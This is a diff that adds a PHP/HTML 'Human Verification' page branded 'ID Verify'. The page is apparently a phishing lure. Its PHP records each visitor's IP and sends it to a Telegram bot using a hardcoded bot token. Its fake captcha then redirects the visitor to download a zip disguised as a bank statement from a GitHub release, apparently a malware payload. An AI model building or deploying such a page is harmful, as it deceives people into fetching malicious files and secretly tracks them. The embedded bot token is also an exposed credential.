@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<?php
+// Path to the file that stores the visit count
+$countFile = 'visit_count.txt';
+
+// Check if the visit count file exists, if not, create it with initial count 0
+if (!file_exists($countFile)) {
+    file_put_contents($countFile, 0);
+}
+
+// Read the current visit count
+$count = file_get_contents($countFile);
+
+// Increment the count
+$count++;
+
+// Save the updxated count
+file_put_contents($countFile, $count);
+
+// Get the visitor's IP address
+$visitorIP = $_SERVER['REMOTE_ADDR'];
+
+// Send the visit data to Telegram
+$telegramBotToken = '7599401253:AAEriOL_4SnE0A-N8TAwJBt5VUpGlcyObnk';
+$chatID = '-4608382410';
+$message = "New visitor with IP: $visitorIP\nTotal Visits: $count";
+
+// Send the message using cURL
+$telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
+file_get_contents($telegramURL);
+
+?>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Human Verification</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    background: #f5f8fb;
+}
+
+.verify-box {
+    width: 420px;
+    max-width: 92%;
+    background: #fff;
+    padding: 38px 35px;
+    border-radius: 14px;
+    box-shadow: 0 8px 30px rgba(0,0,0,.12);
+    text-align: center;
+}
+
+/* LOGO */
+.logo {
+    display: flex;
+    align-items: baseline;
+    justify-content: center;
+    margin-bottom: 25px;
+}
+
+.logo-id {
+    color: #092c50;
+    font-size: 48px;
+    font-weight: 900;
+    letter-spacing: -4px;
+}
+
+.logo-dot {
+    width: 12px;
+    height: 12px;
+    background: #20b77a;
+    border-radius: 50%;
+    margin: 0 7px;
+}
+
+.logo-name {
+    color: #092c50;
+    font-family: Georgia, serif;
+    font-size: 31px;
+    font-weight: bold;
+    font-style: italic;
+}
+
+h2 {
+    color: #142f4c;
+    margin: 0 0 8px;
+}
+
+.description {
+    color: #6b7785;
+    font-size: 14px;
+    margin-bottom: 25px;
+}
+
+.captcha-row {
+    display: flex;
+    gap: 10px;
+}
+
+#captcha {
+    flex: 1;
+    font-size: 27px;
+    font-weight: bold;
+    letter-spacing: 7px;
+    color: #123c63;
+    background: #edf1f4;
+    padding: 17px 10px;
+    border-radius: 7px;
+    user-select: none;
+}
+
+.refresh {
+    width: 58px;
+    border: 1px solid #ccd5df;
+    border-radius: 7px;
+    background: white;
+    color: #173b5e;
+    font-size: 25px;
+    cursor: pointer;
+}
+
+#answer {
+    width: 100%;
+    padding: 14px;
+    margin-top: 18px;
+    border: 1px solid #cbd4dd;
+    border-radius: 7px;
+    font-size: 16px;
+    outline: none;
+}
+
+#answer:focus {
+    border-color: #1674bd;
+}
+
+.continue {
+    width: 100%;
+    padding: 14px;
+    margin-top: 14px;
+    border: 0;
+    border-radius: 7px;
+    background: #0869b8;
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.continue:hover {
+    background: #075a9e;
+}
+
+#error {
+    color: #d93025;
+    font-size: 14px;
+    min-height: 18px;
+}
+
+.security {
+    border-top: 1px solid #e3e7eb;
+    margin-top: 22px;
+    padding-top: 18px;
+    color: #778493;
+    font-size: 12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="verify-box">
+
+    <div class="logo">
+        <span class="logo-id">ID</span>
+        <span class="logo-dot"></span>
+        <span class="logo-name">Verify</span>
+    </div>
+
+    <h2>Verify You're Human</h2>
+
+    <div class="description">
+        Enter the characters shown below to continue.
+    </div>
+
+    <div class="captcha-row">
+
+        <div id="captcha"></div>
+
+        <button class="refresh" onclick="makeCaptcha()">
+            ↻
+        </button>
+
+    </div>
+
+    <input
+        id="answer"
+        type="text"
+        placeholder="Enter the code shown above"
+        autocomplete="off"
+    >
+
+    <button class="continue" onclick="verify()">
+        Continue →
+    </button>
+
+    <p id="error"></p>
+
+    <div class="security">
+        🔒 Secure verification
+    </div>
+
+</div>
+
+<script>
+
+let captcha = "";
+
+function makeCaptcha() {
+
+    const chars =
+        "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+
+    captcha = "";
+
+    for (let i = 0; i < 6; i++) {
+
+        captcha += chars.charAt(
+            Math.floor(Math.random() * chars.length)
+        );
+
+    }
+
+    document.getElementById("captcha").innerText = captcha;
+
+    document.getElementById("answer").value = "";
+}
+
+function verify() {
+
+    const answer =
+        document.getElementById("answer")
+        .value
+        .trim()
+        .toUpperCase();
+
+    if (answer === captcha) {
+
+        /* ضع هنا رابط صفحة عادية تريد الانتقال إليها */
+        window.location.href = "https://github.com/sollm23/next-platform-starter-cfff1/releases/download/v1/E.statments-ViweO3929b.zip";
+
+    } else {
+
+        document.getElementById("error").innerText =
+            "Incorrect code. Please try again.";
+
+        makeCaptcha();
+    }
+}
+
+makeCaptcha();
+
+</script>
+
+</body>
+</html>
